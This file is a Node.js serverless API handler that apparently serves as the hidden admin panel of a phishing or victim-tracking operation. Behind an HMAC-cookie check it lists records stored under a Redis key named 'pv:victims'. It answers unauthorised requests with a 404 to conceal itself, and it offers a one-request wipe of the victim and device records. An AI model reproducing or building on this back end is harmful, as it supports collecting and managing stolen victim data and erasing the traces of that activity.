const crypto = require('crypto');
const { Redis } = require('@upstash/redis');
const kv = new Redis({
  url: process.env.UPSTASH_REDIS_REST_URL || process.env.KV_REST_API_URL || 'https://invalid.upstash.io',
  token: process.env.UPSTASH_REDIS_REST_TOKEN || process.env.KV_REST_API_TOKEN || 'invalid'
});

module.exports = async function handler(req, res) {
  const adminPass = process.env.ADMIN_PASSWORD;
  if (!adminPass) return res.status(404).end();
  if (!verify(req, adminPass)) return res.status(404).end();

  if (req.method === 'GET') {
    let all = {};
    try { all = (await kv.hgetall('pv:victims')) || {}; } catch (e) { console.error('DV_LIST_ERR', e && (e.message || e)); all = {}; }
    const sessions = [];
    for (const v of Object.values(all)) {
      try { sessions.push(typeof v === 'string' ? JSON.parse(v) : v); } catch (e) {}
    }
    sessions.sort((a, b) => String(b.ts || b.t || '').localeCompare(String(a.ts || a.t || '')));
    return res.status(200).json({ sessions: sessions, count: sessions.length });
  }

  if (req.method === 'POST') {
    const body = req.body || {};
    if (body.f === 1) {
      try {
        await kv.del('pv:victims');
        const devKeys = await kv.keys('pv:dev:*');
        if (devKeys && devKeys.length) await kv.del(...devKeys);
      } catch (e) {}
      return res.status(200).json({ ok: 1 });
    }
    return res.status(404).end();
  }

  return res.status(404).end();
};

function verify(req, secret) {
  const c = req.headers.cookie || '';
  const m = c.match(/(?:^|;\s*)dxy_s=(\d{10,13})\.([a-f0-9]{64})/);
  if (!m) return false;
  const exp = Number(m[1]);
  if (!exp || exp * 1000 < Date.now()) return false;
  const expect = crypto.createHmac('sha256', secret).update(String(exp)).digest('hex');
  try { return crypto.timingSafeEqual(Buffer.from(m[2], 'hex'), Buffer.from(expect, 'hex')); } catch (e) { return false; }
}
